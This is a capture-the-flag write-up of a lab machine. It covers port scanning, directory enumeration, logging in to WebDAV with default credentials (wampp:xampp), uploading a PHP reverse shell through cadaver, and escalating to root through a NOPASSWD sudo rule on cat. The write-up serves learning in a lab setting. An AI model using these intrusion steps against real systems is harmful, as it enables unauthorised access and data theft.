Let's do a port scan
```bash
nmap -p- -min-rate=10000 10.10.60.176   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 15:00 EEST
Warning: 10.10.60.176 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.60.176
Host is up (0.23s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
206/tcp   filtered at-zis
9853/tcp  filtered unknown
16894/tcp filtered unknown
21138/tcp filtered unknown
25953/tcp filtered unknown
38700/tcp filtered unknown
41614/tcp filtered unknown
51952/tcp filtered unknown
59633/tcp filtered unknown
62593/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 18.98 seconds
```
```bash
nmap -p 80,206 -sC -sV 10.10.60.176      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 15:03 EEST
Nmap scan report for 10.10.60.176
Host is up (0.35s latency).

PORT    STATE  SERVICE VERSION
80/tcp  open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
206/tcp closed at-zis
```
Ok so there is a website and I have no idea what the other thing is.
```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.60.176/ -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.60.176/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/server-status        (Status: 403) [Size: 300]
/webdav               (Status: 401) [Size: 459]
```
After some enumerating I found a login screen on /webdav now we have to try to find some clues for it. The default crendentials of  was ased Distributed Authoring and Versioning were wampp:xampp

There we were able to find a username and a hashed password which we will break with hashcat
```bash
hashcat -m 1600 -a 0 hash /usr/share/wordlists/rockyou.txt


wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```
I was unable to crack the password so i have to find another way.
I decided to try cadaver in which we can try to upload a shell on the webdav if its not up to date
```bash
cadaver <url>
```
then I put in the previous credentials and uploaded a php revshell to it and executed it and now we have access.

We then found the user.txt and now we must privesc to get the root flag.
Ok the privesc was really easy

```bash
www-data@ubuntu:/usr/bin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
```
So we were able to run the cat command as sudo without password so we were just able to do
```bash
sudo cat "/root/root.txt"
```
Fairly unrealistic but it is finished.
